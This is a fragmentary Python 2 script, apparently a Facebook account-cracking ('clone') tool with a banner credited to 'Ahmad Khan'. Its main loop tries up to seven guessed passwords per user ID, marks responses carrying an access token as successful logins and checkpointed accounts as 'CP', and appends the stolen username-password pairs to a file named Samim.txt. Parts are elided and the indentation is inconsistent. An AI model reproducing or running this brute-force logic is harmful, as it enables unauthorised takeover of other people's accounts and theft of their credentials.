...
\033[1;97m ##     ##    ##           ##### ## \033[1;0m
\033[1;97m--------------------------------------------------
\033[1;97m Code By     : Ahmad Khan

\033[1;97m Friends     : Not Have

\033[1;97m Telegram CH : Not Have

\033[1;97m TLEGRAM GP  : Not Have
\033[1;97m--------------------------------------------------
"""
#call menu
def Furqan():
...
#clone Password
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m(Ahmad Khan_OK) ' + k + c + user + ' | ' + pass1
                okb = open('Samim.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;91m(Ahmad Khan_CP) ' + k + c + user + ' | ' + pass1
                cps = open('Samim.txt', 'a')
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m(Ahmad Khan_OK)' + k + c + user + ' | ' + pass2
                    okb = open('Samim.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;91m(Ahmad Khan_CP) ' + k + c + user + ' | ' + pass2
                    okb = open('Samim.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m(Ahmad Khan_OK) ' + k + c + user + ' | ' + pass3
                        okb = open('Samim.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;91m(Ahmad Khan_CP) ' + k + c + user + ' | ' + pass3
                        cps = open('Samim.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m(Ahmad Khan_OK) ' + k + c + user + ' | ' + pass4
                            okb = open('Samim.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;91m(Ahmad Khan_CP) ' + k + c + user + ' | ' + pass4
                            cps = open('Samim.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m(Ahmad Khan_OK) ' + k + c + user + ' | ' + pass5
                                okb = open('Samim.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;91m(Ahmad Khan_CP) ' + k + c + user + ' | ' + pass5
                                cps = open('Samim.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m(Ahmad Khan_OK) ' + k + c + user + ' | ' + pass6
                                okb = open('Samim.txt', 'a')
                                okb.write(k + c + user + pass6 + '\n')
                                okb.close()
                                oks.append(c + user + pass6 )
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;91m(Ahmad Khan_CP) ' + k + c + user + ' | ' + pass6
                                cps = open('Samim.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m(Ahmad Khan_OK) ' + k + c + user + ' | ' + pass7
                                okb = open('Samim.txt', 'a')
                                okb.write(k + c + user + pass7 + '\n')
                                okb.close()
                                oks.append(c + user + pass7 )
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;91m(Ahmad Khan_CP) ' + k + c + user + ' | ' + pass7
                                cps = open('Samim.txt', 'a')
